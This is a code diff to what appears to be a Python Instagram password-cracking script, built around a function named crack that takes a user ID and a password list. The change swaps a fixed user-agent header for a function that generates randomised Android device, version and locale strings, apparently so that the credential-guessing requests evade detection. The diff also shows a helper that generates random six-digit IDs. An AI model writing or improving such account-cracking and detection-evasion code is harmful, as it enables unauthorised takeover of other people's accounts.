@@ -122,7 +122,7 @@ def crack(uid, password_list, total_count):
             'x-ig-www-claim': 'hmac.AR3mzTXmWJQaei0IjdtQkJIZZIkfif5qOU0tUpKo_5EceiMR',
             'sec-ch-ua-mobile': '?1',
             'x-instagram-ajax': '1010361788',
-            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 105.0.0.11.118 (iPhone11,8; iOS 12_3_1; en_US; en-US; scale=2.00; 828x1792; 165586599)',
+            'user-agent': generate_random_instagram_useragent(),
             'viewport-width': '421',
             'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
@@ -191,6 +191,99 @@ def crack(uid, password_list, total_count):
     
     return False
 
+def generate_random_instagram_useragent():
+    """
+    Generate a random Instagram user agent string with randomized device information.
+    Pattern: Instagram {version} Android ({android_version}/{build}; {dpi}; {resolution}; {brand}; {device}; {model}; {processor}; {language}; {build_id})
+    """
+    
+    # Random version numbers (similar to 63.0.0.17.94)
+    major_version = random.randint(50, 300)
+    minor_version = random.randint(0, 9)
+    patch_version = random.randint(0, 9)
+    sub_version = random.randint(0, 99)
+    build_version = random.randint(0, 99)
+    
+    version = f"{major_version}.{minor_version}.{patch_version}.{sub_version}.{build_version}"
+    
+    # Random Android versions
+    android_versions = [
+        "11", "12", "13", "14", "15", 
+        "10", "9", "8", "7"
+    ]
+    android_version = random.choice(android_versions)
+    build_number = random.randint(1, 99)
+    
+    # Random DPI values
+    dpi_values = [
+        "320dpi", "360dpi", "400dpi", "420dpi", "480dpi", 
+        "560dpi", "640dpi", "266dpi", "290dpi"
+    ]
+    dpi = random.choice(dpi_values)
+    
+    # Random screen resolutions
+    resolutions = [
+        "1080x1920", "1080x2340", "1080x2400", "1080x2460", 
+        "1080x2520", "1080x2376", "720x1600", "720x1560",
+        "1440x3200", "1440x3120", "1200x2660", "1170x2532",
+        "1080x2326", "1080x2372", "1080x2280", "1080x2408"
+    ]
+    resolution = random.choice(resolutions)
+    
+    # Random device brands and models
+    devices = [
+        ("Samsung", "SM-G991B", "Galaxy S21"),
+        ("Samsung", "SM-S908B", "Galaxy S22 Ultra"),
+        ("Google", "Pixel 6", "Pixel 6"),
+        ("Google", "Pixel 7 Pro", "Pixel 7 Pro"),
+        ("Xiaomi", "2201123G", "Redmi Note 11"),
+        ("Vivo", "V2020CA", "V1950A"),
+        ("Oppo", "CPH2269", "Reno6"),
+        ("OnePlus", "LE2123", "OnePlus 9 Pro"),
+        ("Realme", "RMX3363", "Realme GT"),
+        ("Motorola", "XT2125", "Moto G Power"),
+        ("Huawei", "ELG-L04", "P40 Lite"),
+        ("Nokia", "TA-1584", "Nokia 5.4"),
+        ("Sony", "XQ-AS72", "Xperia 1 III"),
+        ("LG", "LM-G900", "G8X"),
+        ("Asus", "ASUS_AI2201", "Zenfone 9"),
+        ("ZTE", "ZTE-A2022", "Axon 30"),
+        ("Tecno", "TECNO-CK7n", "Camon 17"),
+        ("Infinix", "Infinix-X6812", "Note 10 Pro"),
+        ("Lenovo", "L78031", "Vibe K5 Note"),
+        ("HTC", "HTC-2Q5C200", "Desire 22")
+    ]
+    
+    brand, device, model = random.choice(devices)
+    
+    # Random processors
+    processors = [
+        "qcom", "mtk", "exynos", "hisilicon", 
+        "kirin", "sdm", "unisoc"
+    ]
+    processor = random.choice(processors)
+    
+    # Random language codes
+    languages = [
+        "en_US", "en_GB", "id_ID", "es_ES", 
+        "pt_BR", "fr_FR", "de_DE", "it_IT",
+        "ja_JP", "ko_KR", "zh_CN", "ar_SA",
+        "hi_IN", "ru_RU", "tr_TR", "vi_VN",
+        "th_TH", "ms_MY", "nl_NL", "pl_PL"
+    ]
+    language = random.choice(languages)
+    
+    # Random build ID (10-digit number)
+    build_id = random.randint(100000000, 999999999)
+    
+    # Construct the user agent string
+    user_agent = (
+        f"Instagram {version} Android ({android_version}/{build_number}; "
+        f"{dpi}; {resolution}; {brand}; {device}; {model}; "
+        f"{processor}; {language}; {build_id})"
+    )
+    
+    return user_agent
 
 def generate_random_ids(limit):
     """Generate random 6-digit IDs"""
